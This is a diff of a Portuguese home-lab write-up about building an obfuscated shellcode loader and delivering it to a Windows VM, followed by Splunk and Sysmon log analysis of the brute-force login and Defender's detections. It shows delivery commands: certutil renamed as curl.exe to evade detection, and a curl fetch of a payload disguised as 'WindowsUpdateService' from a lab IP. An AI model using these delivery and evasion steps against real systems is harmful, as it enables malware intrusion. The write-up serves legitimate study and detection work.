@@ -85,7 +85,7 @@ Agora nos temos um shellcode pronto para ser inserido no codigo.
 
 ### Sobre o codigo
 
- Este codigo em Python que descriptografa o shellcode AES-CBC (armazenado em Base64), remove o padding PKCS7 (Adiciona bytes ao para garantir que ele tenha o tamanho exato de um multiplo de 16 bytes como e necessario em AES), aloca memória executável em uma heap privada do processo e executa o shellcode usando CreateThread. A chave e o IV devem ser os mesmos usados na criptografia.
+ Este codigo em Python que descriptografa o shellcode AES-CBC (armazenado em Base64), remove o padding PKCS7 (padding PKCS7 é um método de preenchimento usado em criptografia para garantir que os dados tenham o tamanho exato exigido pelo algoritmo ele adiciona bytes ao bloco para garantir que ele tenha o tamanho exato de um multiplo de 16 bytes como e necessario em AES), aloca memória executável em uma heap privada do processo e executa o shellcode usando CreateThread. A chave e o IV devem ser os mesmos usados na criptografia.
 
  ```Python
 import base64
@@ -152,7 +152,7 @@ Este comando retornou um executavel pronto mas tambem um arquivo .spec que vamos
 
 ### .SPEC FILE 
 
-```bash
+```
 # -*- mode: python ; coding: utf-8 -*-
 
 block_cipher = None
@@ -212,15 +212,17 @@ reducing forensic visibility. No external dependencies are bundled, keeping the 
 
 After configure the .spec file we generate the final executable from the .spec in a same folder of the code:
 
-```bash
+```
 wine cmd
 pyinstaller --onefile malwareobfuscated.spec
 ```
 
+[GERANDO O EXECUTAVEL APARTIR DO ARQUVIVO .SPEC]
 ![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
 
 Esse e o resultado final do processo de criacao agora estamos prontos para realizar a entrega do malware:
 
+[MALWARE PRONTO PARA SER ENTREGUE]
 ![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)
 
 
@@ -235,12 +237,15 @@ deixar rastros o uso de certutil ja e bem conhecido pelos sistemas de defesa mas
 
 Aqui realizei o brute force e consegui uma senha:
 
+[RESULTADO DO BRUTE FORCE]
 ![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)
 
 Logo apos realizei a requisicao usando certutil.exe como LOLbin:
 
- [CERTUTIL.exe COMMAND]
- 
+### 1 TENTATIVA:
+
+
+ [PRIMEIRA REQUISICAO USANDO CERTUTIL.exe] 
 ![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)
 
 A principio pensei que o certutil.exe tivesse conseguido baixar o malware e logo apos Windows Defender teria bloqueado a execucao entretanto notei que nao havia 
@@ -270,8 +275,12 @@ Para tirar a duvida tentei realizar uma requisicao para um site benigno ```googl
 
  Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
  ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao observa somente o destino das requisicoes mas 
- mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).Vamos tirar a prova final tentando uma ultima tecnica, vou criar uma copia do certutil.exe em um outro folder com um 
- outro nome e vou tentar realizar uma requisicao atraves desta copia, abaixo vou deixar os comandos usados e a resposta recebida:
+ mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).
+
+ ### 2 TENTATIVA:
+
+Vamos tirar a prova final tentando uma ultima tecnica, vou criar uma copia do certutil.exe em um outro folder com um 
+ outro nome e vou tentar realizar uma requisicao atraves desta copia, abaixo vou deixar os comandos usados e a resposta recebida.
 
 ```
 1.
@@ -284,7 +293,11 @@ C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com
  [RESPOSTA DA SEGUNDA TENTATIVA USANDO CERTUTIL]
  ![Image](https://github.com/user-attachments/assets/1d7c7848-f616-4888-bb17-a946f862cb52)
 
-Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para um site confiavel o Windows Defender detectou a atividade e bloqueou a acao, sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl:
+Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para um site confiavel o Windows Defender detectou a atividade e bloqueou a acao.
+
+### 3 TENTATIVA 
+
+Ja que nao podemos usar certutil para realizar o download vou fazer uma requisicao curl simples para verificar se o defender identifica a presenca do malware
 
 ```curl http://192.168.56.101:7070/WindowsUpdateService```
 ![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)
@@ -298,22 +311,18 @@ Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para u
 
 ---
 
-## 🔍 Coleta e Análise dos Logs
+## 🔍 ANALISE DOS LOGS
 
-### 📁 Splunk - Configuração
-Trecho da config usada (ou link para ela).
-
-
-*TENTATIVAS DE LOGIN*
+**Note:** Para escrever esse artigo realizei a entrega do malware muitas vezes em dias diferentes entao nao se prendam muito as datas dos logs 
 
 
-[BRUTE FORCE EVIDENCE]
+1. [BRUTE FORCE EVIDENCE]
 ![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
 Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
 a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
 Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Event Viewer registrou os seguintes comportamentos:
 
-1. [CREATION OF REMOTE TREAT]
+2. [CREATION OF REMOTE TREAT]
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
 Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Entretanto nos ja sabemos que o malware nao foi nem se quer baixado
 entao eu acredito que este log foi acionado quando eu solicitei um cmd.exe via ssh, mesmo que nao esteja diretamente relacionado com o malware ainda sim e um artefato importante.
@@ -341,24 +350,26 @@ Action Taken:     Not Applicable
 Como podemos ver o Windows Defender bloqueou a requisicao antes que houve a conexao por isso nao foi identificado o IP.
 
 
-3.[CONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
+4.[CONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
 ![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)
 
 Neste ultimo log nos temos a confirmacao de que a ameca foi removida com sucesso pelo windows defender ```Action Name: Remove```, ``` The operation completed successfully.```
 
-4.[IDENTIFICACAO DA SEGUNDA TENTATIVA]
+5.[IDENTIFICACAO DA SEGUNDA TENTATIVA]
 ![Image](https://github.com/user-attachments/assets/aa39d6f0-9dad-4fba-831c-7bfe3a810af9)
+
+```Path CmdLine:_C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com```
+
 Por ultimos mas nao menos importante temos a confirmacao que o Windows Defender localizaou a execucao maliciosa do
 certutil.exe mesmo em um outro diretorio e com um nome diferente.
 
 ##CONCLUSAO 
 
-Este laboratorio acabou sendo mais Read Team do que Bue Team, apesar de nao ter conseguido executar obfuscar o malware o sulficiente o processo de criacao 
-e tecnicas de ofuscacao me deram insight importantes para serem usados em laboratorios futuros. Em relacao a parte defensiva do projeto houveram menos eventos
-do que eu esperava, Splunk foi muito util para detectar os eventos de brute force e a ativacao do sistema de defesa mas o que eu acredito ter sido o aprendizado mais importante 
-foi o processo de instalao e configuracao do splunk. 
+Embora meu foco atual esteja na área de segurança defensiva, este laboratório acabou explorando técnicas ofensivas mais profundamente do que eu esperava. A criação e ofuscação do shellcode me deram uma visão prática de como cargas maliciosas podem ser construídas e executadas de forma discreta no Windows.
 
+Apesar de o código ainda poder ser aprimorado com técnicas mais avançadas de evasão, essa experiência me proporcionou um entendimento mais concreto sobre como o Windows Defender e outras soluções de segurança operam, além de como algumas técnicas simples já são suficientes para contornar mecanismos de defesa padrão.
 
+No contexto defensivo, isso reforça a importância de conhecer as ferramentas e táticas do adversário para desenvolver detecções mais eficazes, tanto em ambientes corporativos quanto em labs de threat hunting.
 
 
 
